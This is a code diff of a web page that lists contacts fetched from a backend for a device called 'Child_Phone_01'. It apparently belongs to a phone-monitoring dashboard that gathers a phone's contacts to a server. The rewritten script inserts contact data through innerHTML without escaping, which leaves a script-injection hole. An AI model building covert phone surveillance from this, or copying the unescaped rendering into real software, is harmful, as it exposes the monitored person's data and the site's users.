@@ -20,59 +20,82 @@
             background-image: linear-gradient(45deg, #000000, #1a1a1a);
             color: var(--text-main);
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            margin: 0; padding: 20px;
-            display: flex; justify-content: center;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
         }
 
         .container {
-            width: 100%; max-width: 450px;
+            width: 100%;
+            max-width: 450px;
             background: rgba(0, 0, 0, 0.5);
-            border-radius: 30px; padding: 20px;
+            border-radius: 30px;
+            padding: 20px;
             border: 1px solid var(--glass-border);
             min-height: 80vh;
         }
 
         .header {
-            display: flex; align-items: center; justify-content: space-between;
-            margin-bottom: 25px; padding-bottom: 15px;
+            display: flex;
+            align-items: center;
+            margin-bottom: 25px;
+            padding-bottom: 15px;
             border-bottom: 1px solid var(--glass-border);
         }
 
-        .back-btn { color: var(--text-main); font-size: 1.2rem; text-decoration: none; }
-        .page-title { font-size: 1.2rem; font-weight: bold; }
-
-        .refresh-btn { 
-            background: var(--accent); border: none; color: white; 
-            padding: 5px 12px; border-radius: 15px; cursor: pointer; font-size: 0.8rem;
+        .back-btn {
+            color: var(--text-main);
+            font-size: 1.2rem;
+            text-decoration: none;
+            margin-right: 15px;
         }
 
+        .page-title {
+            font-size: 1.2rem;
+            font-weight: bold;
+        }
+
+        /* Contact List Styling */
         .contact-list {
-            display: flex; flex-direction: column; gap: 10px;
-            max-height: 600px; overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            max-height: 600px;
+            overflow-y: auto;
         }
 
         .contact-card {
-            background: var(--glass-bg); padding: 12px;
-            border-radius: 15px; display: flex; align-items: center;
-            border: 1px solid var(--glass-border); transition: 0.2s;
+            background: var(--glass-bg);
+            padding: 15px;
+            border-radius: 15px;
+            display: flex;
+            align-items: center;
+            border: 1px solid var(--glass-border);
         }
 
-        .contact-card:hover { border-color: var(--accent); background: rgba(255,255,255,0.15); }
-
         .avatar {
-            width: 40px; height: 40px;
+            width: 40px;
+            height: 40px;
             background: linear-gradient(45deg, #4caf50, #2e7d32);
-            border-radius: 50%; display: flex; align-items: center;
-            justify-content: center; font-weight: bold; margin-right: 15px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            margin-right: 15px;
         }
 
         .info { flex: 1; }
-        .name { font-size: 0.95rem; font-weight: 500; }
-        .number { font-size: 0.8rem; color: var(--text-muted); margin-top: 2px; }
+        .name { font-size: 1rem; font-weight: 500; }
+        .number { font-size: 0.85rem; color: var(--text-muted); margin-top: 2px; }
 
-        .call-icon { color: var(--accent); font-size: 1.1rem; padding: 10px; }
-
-        .empty-state { text-align: center; color: #666; margin-top: 50px; }
+        .call-icon {
+            color: var(--accent);
+            font-size: 1.2rem;
+            padding: 10px;
+            cursor: pointer;
+        }
     </style>
 </head>
 <body>
@@ -81,60 +104,48 @@
         <div class="header">
             <a href="index.html" class="back-btn"><i class="fa-solid fa-chevron-left"></i></a>
             <span class="page-title">Contacts List</span>
-            <button class="refresh-btn" onclick="fetchContacts()">Sync</button>
         </div>
 
         <div class="contact-list" id="contactsContainer">
-            <div class="empty-state"><i class="fa-solid fa-spinner fa-spin"></i><br>Loading...</div>
+            <div style="text-align: center; color: #666; margin-top: 50px;">Loading contacts...</div>
         </div>
     </div>
 
     <script>
-        // ⚠️ Render URL aur Device ID sahi set karein
-        const RENDER_URL = "https://child-v9no.onrender.com";
-        const DEVICE_ID = "Child_Phone_01";
+        // API call to Node.js backend
+        fetch('/api/contacts/Child_Phone_01')
+            .then(response => response.json())
+            .then(data => {
+                const container = document.getElementById("contactsContainer");
+                container.innerHTML = ""; // Clear loading text
 
-        async function fetchContacts() {
-            const container = document.getElementById("contactsContainer");
-            
-            try {
-                // Sahi API Path ka use: /api/get-data/DEVICE_ID/contacts
-                const response = await fetch(`${RENDER_URL}/api/get-data/${DEVICE_ID}/contacts`);
-                const data = await response.json();
-
-                container.innerHTML = ""; 
-
-                if(!data || data.length === 0) {
-                    container.innerHTML = "<div class='empty-state'>No contacts found on server.</div>";
+                if(data.length === 0) {
+                    container.innerHTML = "<div style='text-align:center; padding:20px;'>No contacts found</div>";
                     return;
                 }
 
-                // Contacts ko Name ke hisaab se sort karna (A-Z)
-                data.sort((a, b) => (a.name || "").localeCompare(b.name || ""));
-
                 data.forEach(contact => {
+                    // Avatar ke liye first letter
                     const initial = contact.name ? contact.name.charAt(0).toUpperCase() : "?";
                     
-                    const card = document.createElement("div");
-                    card.className = "contact-card";
-                    card.innerHTML = `
-                        <div class="avatar">${initial}</div>
-                        <div class="info">
-                            <div class="name">${contact.name || "Unknown"}</div>
-                            <div class="number">${contact.number || "No Number"}</div>
+                    const card = `
+                        <div class="contact-card">
+                            <div class="avatar">${initial}</div>
+                            <div class="info">
+                                <div class="name">${contact.name || "Unknown"}</div>
+                                <div class="number">${contact.number}</div>
+                            </div>
+                            <div class="call-icon"><i class="fa-solid fa-phone"></i></div>
                         </div>
-                        <div class="call-icon"><i class="fa-solid fa-phone"></i></div>
                     `;
-                    container.appendChild(card);
+                    container.innerHTML += card;
                 });
-            } catch (err) {
+            })
+            .catch(err => {
                 console.error("Error:", err);
-                container.innerHTML = "<div class='empty-state' style='color:red;'>Failed to connect to server.</div>";
-            }
-        }
-
-        // Page load par fetch karein
-        document.addEventListener("DOMContentLoaded", fetchContacts);
+                document.getElementById("contactsContainer").innerHTML = 
+                    "<div style='text-align:center; color:red;'>Failed to load contacts.</div>";
+            });
     </script>
 </body>
 </html>
